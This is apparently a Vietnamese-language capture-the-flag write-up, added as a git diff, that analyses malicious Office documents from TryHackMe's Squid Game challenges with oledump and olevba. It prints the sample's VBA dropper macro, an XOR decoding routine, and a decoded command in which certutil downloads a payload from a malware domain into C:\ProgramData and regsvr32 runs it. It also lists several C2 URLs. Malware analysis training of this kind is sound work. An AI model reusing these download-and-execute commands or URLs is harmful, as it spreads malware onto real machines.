@@ -118,3 +118,217 @@ Provide the name of the stream that contains a macro.
 ```
 Name of the stream thì dựa vào `oledump` ban nãy là được =))
 #### Flag: ThisDocument
+
+
+Atacker 2
+===
+
+```
+Provide the streams (numbers) that contain macros. 
+```
+Sử dụng oledump để check xem `stream` nào có chứa `macro` như những lần trước. Check thì ra kết quả. Có `M` là Macro
+
+#### Flag: 12, 13, 14, 16
+
+```
+Provide the size (bytes) of the compiled code for the second stream that contains a macro.
+```
+
+Để xem được (size) của stream thì thêm command `-i` vào thì thấy hàng thứ 3 chính là số byte của nó
+
+<p align ="center">
+  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/93c1f33e-a67a-43fa-8ccb-7886171caaa2">
+</p>
+
+#### Flag: 13867
+
+
+```
+Provide the largest number of bytes found while analyzing the streams.
+```
+Để tìm số bytes lớn nhất thì tìm bên trong phần hàng số 2 của hình trên.
+
+#### Flag: 63641
+
+
+```
+Find the command located in the ‘fun’ field ( make sure to reverse the string).
+```
+Kiểm tra bằng olevba để xem `macro` trong đó, có thể full [tại đây](https://github.com/P5ySm1th/noob-learn-cybersec/blob/main/Tryhackme/Others/%5Bsquidgame_attacker2%5D%20attacker2.vbs)
+
+Ta thấy được biến `fun` được sử dụng với câu lệnh `StrReverse` 
+
+```
+Sub eFile()
+Dim QQ1 As Object
+Set QQ1 = New Form
+RO = StrReverse("\ataDmargorP\:C")
+ROI = RO + StrReverse("sbv.nip")
+ii = StrReverse("")
+Ne = StrReverse("IZOIZIMIZI")
+WW = QQ1.t2.Caption
+MyFile = FreeFile
+Open ROI For Output As #MyFile
+Print #MyFile, WW
+Close #MyFile
+fun = Shell(StrReverse("sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"), Chr(48))
+End
+End Sub
+```
+
+#### Flag: cmd /k cscript.exe C:\ProgramData\pin.vbs
+
+```
+Provide the first domain found in the maldoc.
+```
+Này mình để cho `olevba` check trước kéo xuống dưới thì thấy được mấy cái url luôn rồi =))) còn không có thì check bên trong các đoạn source code thôi :)
+
+#### Flag: priyacareers.com/u9hDQN9Yy7g/pt.html
+
+```
+Provide the second domain found in the maldoc.
+```
+
+Thằng này cũng vậy =))) không có khác gì hết
+#### Flag: perfectdemos.com/Gv1iNAuMKZ/pt.html
+
+```
+Provide the name of the first malicious DLL it retrieves from the C2 server.
+```
+Câu này thì check `olevba` thì có luôn hẳn nha =))) còn không có thì tự thân vận động check `sourcecode`
+
+#### Flag: www1.dll
+
+```
+How many DLLs does the maldoc retrieve from the domains?
+```
+Cái này thì đếm bên trong `olevba` thì có hẳn luôn =))
+
+#### Flag: 5
+
+```
+Provide the path of where the malicious DLLs are getting dropped onto?
+```
+
+check vào stream  OLE stream: `'Macros/Form/o'` ta sẽ thấy được nó sử dụng cộng string và sau đó nó load file `dll` chạy ở C:\\ProgramData
+
+#### Flag: C:\ProgramData
+
+```
+What program is it using to run DLLs?
+```
+Vẫn check bên trong đó, thì thấy nó execute `cmd` chạy file `rundll32.exe` để khởi động dll của malware
+#### Flag: rundll32.exe 
+
+
+```
+How many seconds does the function in the maldoc sleep for to fully execute the malicious DLLs?
+```
+
+Vẫn check hàm đó tiếp ta thấy nó là hàm `loop` để chạy `5 dll`. thì trên đó trước khi execute nó sẽ sleep `1500` ở đây là 1500ms --> convert ra là `15s`
+
+#### Flag: 15
+
+
+```
+Under what stream did the main malicious script use to retrieve DLLs from the C2 domains? (Provide the name of the stream).
+```
+Như đã nói thì xét function bên trong `olevba` thì ta đã có được kết quả sẵn rồi =))) stream này đây =)) ` OLE stream: Macros/Form/o`
+
+#### Flag: Macros/Form/o
+
+
+Atacker 3
+===
+```
+ Provide the executable name being downloaded. 
+```
+
+Check trước bằng `olevba` thì ra được một hàm autorun sau đây:
+
+<p align ="center">
+  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/387ba96b-e3a8-4931-be2d-418208878e74">
+</p>
+
+Nôm na thì có sẽ đặt biến `u = tutil` và sau đó nó gán `cer + <biến u>.exe` biến nó thành `1.exe` thì nếu nhìn bằng mắt thì thấy là có file `1.exe`
+
+#### Flag: 1.exe
+
+```
+What program is used to run the executable?
+```
+Thì như nói ở trên là nó do cái hàm này làm hết
+
+<p align ="center">
+  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/387ba96b-e3a8-4931-be2d-418208878e74">
+</p>
+
+#### Flag: certutil.exe
+
+```
+Provide the malicious URI included in the maldoc that was used to download the binary (without http/https).
+```
+
+Ta thấy có hàm `h` như sau:
+```python
+Function h(ju)
+eR = Split(ju, "%")
+For lc = 0 To UBound(eR)
+ hh = hh & Chr(eR(lc) Xor 111)
+Next lc
+h = hh
+End Function
+```
+
+Nếu khó hiểu thì ta có thể dịch nó sang ngôn ngữ `python` cũng được như sau: 
+
+```python
+def h(ju):
+  eR = ju.split("%")
+  hh = ""
+  for lc in range(len(eR)):
+    hh += chr(int(eR[lc]) ^ 111)
+  return hh
+```
+
+Nôm na là nó sẽ tách những letter `%` vào `eR` và sau đó chạy vòng for để `Xor` với 111.  Việc chúng ta cần làm là chạy hmaf để biết nó làm gì. Full source code dưới đây:
+
+```python
+def h(ju):
+  eR = ju.split("%")
+  hh = ""
+  for lc in range(len(eR)):
+    hh += chr(int(eR[lc]) ^ 111)
+  return hh
+
+cipher = "12%2%11%79%64%12%79%77%28%10%27%79%26%82%26%29%3%73%73%12%14%3%3%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%10%23%10%79%64%74%26%74%49%12%49%14%49%12%49%7%49%10%49%79%64%9%49%79%7%27%27%31%85%64%64%87%12%9%14%22%25%65%12%0%2%64%13%0%3%13%64%5%14%10%1%27%65%31%7%31%80%3%82%3%6%26%27%89%65%12%14%13%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%79%73%73%79%12%14%3%3%79%29%10%8%28%25%29%92%93%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%77"
+print(h(cipher))
+```
+
+ta sẽ ra được đoạn như sau: 
+```
+cmd /c "set u=url&&call C:\ProgramData\1.exe /%u%^c^a^c^h^e^ /f^ http://8cfayv.com/bolb/jaent.php?l=liut6.cab C:\ProgramData\1.tmp && call regsvr32 C:\ProgramData\1.tmp"
+```
+
+Thì ta ra được flag
+#### Flag: http://8cfayv.com/bolb/jaent.php?l=liut6.cab
+
+
+```
+What folder does the binary gets dropped in?
+```
+
+Thì nhìn vào đoạn code output thì là biết rồi =)) không biết thì dẹp :D 
+
+#### Flag: ProgramData
+
+```
+ Which stream executes the binary that was downloaded? 
+```
+Check kĩ lại đoạn `olevba` thì thấy được rằng `binary` được download trong `VBA MACRO T.bas ` check = `oledump` thì ra được stream đó luôn
+
+<p align ="center">
+  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/b96988b5-05a9-4a3d-a292-d35a30041db8">
+</p>
+
+#### Flag: A3
